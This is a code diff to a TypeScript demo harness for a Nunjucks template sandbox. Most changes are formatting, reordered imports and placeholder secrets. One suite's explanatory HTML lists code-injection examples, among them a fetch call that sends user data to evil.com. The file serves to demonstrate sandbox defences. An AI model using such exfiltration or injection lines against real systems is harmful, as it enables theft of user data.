@@ -1,6 +1,6 @@
 import type { NunjucksConfig } from '@nunjucks/core';
-import { renderDemoTemplate } from './render-template.ts';
 import { escapeHtml } from './error-route-utils.ts';
+import { renderDemoTemplate } from './render-template.ts';
 
 interface TestCase {
   name: string;
@@ -54,42 +54,47 @@ const runTests = async ({
         context,
         config: testConfig,
       });
-      const outcome: TestOutcome = result.ok
-        ? [null, result.value]
-        : [result.error, null];
+      const outcome: TestOutcome = result.ok ? [null, result.value] : [result.error, null];
       const blocked = outcome[0] !== null;
       const passed =
-        test.shouldPass === undefined
-          ? null
-          : (outcome[0] === null) === test.shouldPass;
+        test.shouldPass === undefined ? null : (outcome[0] === null) === test.shouldPass;
       return { name: test.name, outcome, blocked, passed };
-    }),
+    })
   );
 
 const outcomeError = (row: SandboxTestResult): Error | null => row.outcome[0];
 
-const classifyStatus = (row: SandboxTestResult, suite: SandboxSuite): { className: string; label: string } => {
+const classifyStatus = (
+  row: SandboxTestResult,
+  suite: SandboxSuite
+): { className: string; label: string } => {
   switch (suite.statusMode) {
     case 'blocked':
-      return { className: row.blocked ? 'blocked' : 'allowed', label: row.blocked ? 'BLOCKED' : 'ALLOWED' };
+      return {
+        className: row.blocked ? 'blocked' : 'allowed',
+        label: row.blocked ? 'BLOCKED' : 'ALLOWED',
+      };
     case 'normal':
       return {
-        className: row.name.includes('__proto__') || row.name.includes('constructor') ? 'danger' : '',
+        className:
+          row.name.includes('__proto__') || row.name.includes('constructor') ? 'danger' : '',
         label: outcomeError(row) !== null ? 'Error' : 'Allowed',
       };
     case 'allowlist':
-      return { className: row.passed ? 'passed' : 'failed', label: row.passed ? 'Correct' : 'Unexpected' };
+      return {
+        className: row.passed ? 'passed' : 'failed',
+        label: row.passed ? 'Correct' : 'Unexpected',
+      };
   }
 };
 
-const statusClass = (row: SandboxTestResult, suite: SandboxSuite): string => classifyStatus(row, suite).className;
+const statusClass = (row: SandboxTestResult, suite: SandboxSuite): string =>
+  classifyStatus(row, suite).className;
 
-const statusLabel = (row: SandboxTestResult, suite: SandboxSuite): string => classifyStatus(row, suite).label;
+const statusLabel = (row: SandboxTestResult, suite: SandboxSuite): string =>
+  classifyStatus(row, suite).label;
 
-const renderTable = (
-  table: SandboxTestResult[],
-  suite: SandboxSuite,
-): string => {
+const renderTable = (table: SandboxTestResult[], suite: SandboxSuite): string => {
   const rows = table
     .map((row) => {
       const err = outcomeError(row);
@@ -173,7 +178,7 @@ const sandboxSuites: SandboxSuite[] = [
       user: {
         name: 'John',
         admin: true,
-        data: { secret: 'API_KEY_123' },
+        data: { secret: 'EXAMPLE_API_KEY' },
       },
     },
     config: {},
@@ -235,20 +240,20 @@ const sandboxSuites: SandboxSuite[] = [
     accentColor: '#8e44ad',
     statusMode: 'allowlist',
     introHtml:
-      '<div class="code"><strong>Configuration:</strong><br/>sandbox: true<br/>sandboxAllowlist: [\'user\', \'name\']<br/>sandboxMode: \'allowlist\'</div>' +
+      "<div class=\"code\"><strong>Configuration:</strong><br/>sandbox: true<br/>sandboxAllowlist: ['user', 'name']<br/>sandboxMode: 'allowlist'</div>" +
       '<p>In allowlist mode, ONLY the specified keys are allowed. Everything else is blocked.</p>',
     outroHtml:
       '<h2>How It Works</h2>' +
       '<p>In blocklist mode (default), dangerous keys are blocked but everything else is allowed.<br/>' +
       'In allowlist mode, only explicitly whitelisted keys are allowed.</p>' +
       '<pre>{ sandbox: true }' +
-      '{ sandbox: true, sandboxAllowlist: [\'user\', \'name\'], sandboxMode: \'allowlist\' }</pre>',
+      "{ sandbox: true, sandboxAllowlist: ['user', 'name'], sandboxMode: 'allowlist' }</pre>",
     context: {
       user: {
         name: 'John',
-        password: 'secret123',
+        password: 'example-secret',
         admin: true,
-        data: { secret: 'API_KEY' },
+        data: { secret: 'EXAMPLE_API_KEY' },
       },
     },
     config: {
@@ -277,9 +282,9 @@ const sandboxSuites: SandboxSuite[] = [
       '<h2>Why Block These?</h2>' +
       '<p>These functions can be used for code injection attacks:</p>' +
       '<ul>' +
-      '<li><code>setTimeout(\'alert(1)\', 0)</code> - Timing attack</li>' +
+      "<li><code>setTimeout('alert(1)', 0)</code> - Timing attack</li>" +
       '<li><code>eval(userInput)</code> - Direct code execution</li>' +
-      '<li><code>fetch(\'http://evil.com?data=\' + userData)</code> - Data exfiltration</li>' +
+      "<li><code>fetch('http://evil.com?data=' + userData)</code> - Data exfiltration</li>" +
       '</ul>',
     context: {
       user: {
@@ -312,5 +317,5 @@ const sandboxSuites: SandboxSuite[] = [
   },
 ];
 
-export { runTests, renderTable, sandboxSuites };
-export type { TestCase, SandboxTestResult, SandboxSuite };
+export type { SandboxSuite, SandboxTestResult, TestCase };
+export { renderTable, runTests, sandboxSuites };
